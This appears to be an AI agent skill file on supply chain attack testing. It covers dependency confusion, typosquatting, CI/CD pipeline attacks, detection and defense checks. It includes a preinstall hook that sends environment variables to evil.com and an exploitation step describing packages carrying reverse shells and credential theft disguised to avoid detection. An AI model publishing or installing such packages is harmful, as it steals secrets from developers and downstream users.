---
name: supply-chain-attacker
description: Software supply chain attack testing — dependency confusion, typosquatting, malicious packages, CI/CD pipeline
  exploitation. Use when assessing supply chain security, testing package managers, or finding supply chain vulnerabilities.
domain: cybersecurity
tags:
- attacker
- chain
- cybersecurity
- pipeline
- security
- supply
- testing
- threat-defense
---

# Supply Chain Attacker

Supply chain attacks are the new frontier. One poisoned dependency affects thousands of downstream users. This skill covers finding and exploiting supply chain vulnerabilities.

## When to Use

- Testing dependency management security
- Assessing CI/CD pipeline security
- Finding dependency confusion vulnerabilities
- Testing package publishing processes
- Evaluating third-party risk

## The Process

1. **Scope and authorize** — confirm written authorization and define target boundaries
2. **Reconnaissance** — enumerate targets, services, and potential attack surfaces
3. **Exploitation** — attempt exploitation of identified vulnerabilities within scope
4. **Post-exploitation** — document access level, lateral movement, and data exposure
5. **Report and remediate** — compile findings with reproduction steps and fix recommendations
### 1. Dependency Confusion

#### How It Works
```
# Company uses internal package: @company/utils
# Attacker publishes public package: company-utils
# If package manager resolves public first → attacker's code runs

# Attack vector:
1. Find internal package names (from JS bundles, error messages, job postings)
2. Publish public packages with same name but higher version
3. Wait for company to install/update
4. Attacker's code executes in company environment
```

#### Discovery
```bash
# Find internal package names
# Check: package-lock.json, yarn.lock, .npmrc, .yarnrc
# Search: JS bundles for import paths
# Monitor: error messages for package names
# Check: job postings for technology stack

# Tools:
npm-internal-package-scanner
confusion-checker
```

#### Exploitation
```bash
# Publish malicious package
npm publish company-utils --access public

# Package content:
# preinstall.js → reverse shell, data exfil, credential theft
# Use legitimate-looking code to avoid detection
```

### 2. Typosquatting

#### Common Patterns
```
# Popular package typos
lodash → lodahs, lodaish, lod-ash
express → exprees, expess, exprees
react → raect, reatc, reacct
requests → requets, reqeusts, requestss

# Scope confusion
@company/utils → company-utils (unscoped)
@company/utils → @cornpany/utils (homoglyph)
```

#### Attack Implementation
```bash
# Monitor for popular package typos
# Register common misspellings
# Include malicious install scripts
# Use postinstall/preinstall hooks

# Package.json:
{
  "scripts": {
    "preinstall": "node -e \"require('https').get('https://evil.com/exfil?data='+process.env)\""
  }
}
```

### 3. Repository Poisoning

#### GitHub/GitLab Attacks
```
# Compromised maintainer account
# Malicious commit to popular repo
# Force push to rewrite history
# Steal GitHub tokens via Actions

# Attack via Pull Request:
1. Find dependency used by target
2. Submit PR to dependency repo
3. Include malicious code in PR
4. If merged → all users affected
```

#### Package Registry Attacks
```
# npm/PyPI/RubyGems/crates.io
# Account takeover of maintainer
# Malicious version publish
# Dependency confusion
# Install script exploitation
```

### 4. CI/CD Pipeline Attacks

#### GitHub Actions
```yaml
# Vulnerable workflow:
on: pull_request
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      - run: npm test  # Runs attacker's code from PR

# Attack: Submit PR with malicious package.json
# npm test runs attacker's preinstall script
```

#### Common CI/CD Vulnerabilities
```
# Secrets in environment variables
# Unpinned action versions
# Pull request triggers with write access
# Artifact poisoning
# Self-hosted runner compromise
# Cache poisoning
```

### 5. Build System Attacks

#### Compromised Build Tools
```
# Malicious compiler
# Backdoored build tool
# Poisoned base images
# Compromised artifact repository

# Example: SolarWinds attack pattern
1. Compromise build system
2. Inject backdoor during build
3. Distribute to all customers
4. Backdoor activates post-install
```

### 6. Detection Techniques

#### Static Analysis
```bash
# Scan for suspicious patterns
# Check: network calls in install scripts
# Check: obfuscated code
# Check: unusual file operations
# Check: environment variable access

# Tools:
npm-audit
snyk test
socket.dev
safety (Python)
bundler-audit (Ruby)
```

#### Dynamic Analysis
```bash
# Run package in sandbox
# Monitor: network calls, file operations, process creation
# Check: what data is exfiltrated

# Tools:
socket.dev (npm analysis)
package-analysis (Google)
sandboxing tools
```

### 7. Defense Testing

#### Test Controls
```
# Verify: package-lock.json is used
# Verify: private registry configured
# Verify: install scripts disabled
# Verify: dependency scanning enabled
# Verify: version pinning enforced
# Verify: artifact signing verified
```

## When NOT to Use

- Task is outside your authorization scope
- You need to implement controls (use implementing-* skills)
- Task is about analysis, not action (use analyzing-* skills)
- You don't have access to target systems
- Task requires compliance expertise (consult professionals)
- Task is about defense, not offense (use defensive skills)


## Red Flags

- Publishing malicious packages (even for testing)
- Compromising real packages
- Accessing real credentials
- Affecting production systems
- Not cleaning up test artifacts

## Verification

- All tests performed in isolated environments
- No real packages were compromised
- Findings demonstrate actual risk (not theoretical)
- Remediation recommendations specific to package manager
- Defense controls tested and validated

## Revenue Potential

Supply chain vulnerabilities pay extremely well:
- Dependency confusion: $5000-$50000
- Popular package compromise: $10000-$100000
- CI/CD pipeline exploit: $5000-$25000
- Package registry vulnerability: $5000-$50000
- Build system compromise: $10000-$100000

## Tools

| Purpose | Tools |
|---------|-------|
| Dependency scanning | npm-audit, snyk, safety, bundler-audit |
| Package analysis | socket.dev, package-analysis |
| Confusion detection | confusion-checker, npm-internal-package-scanner |
| CI/CD security | actionlint, zizmor |
| Supply chain | sigstore, in-toto, SLSA |

## References

- SLSA Framework
- Sigstore
- npm Security Best Practices
- OWASP Software Component Verification
- SolarWinds Attack Analysis

## Overview

> Section content — see SKILL.md body for full details.
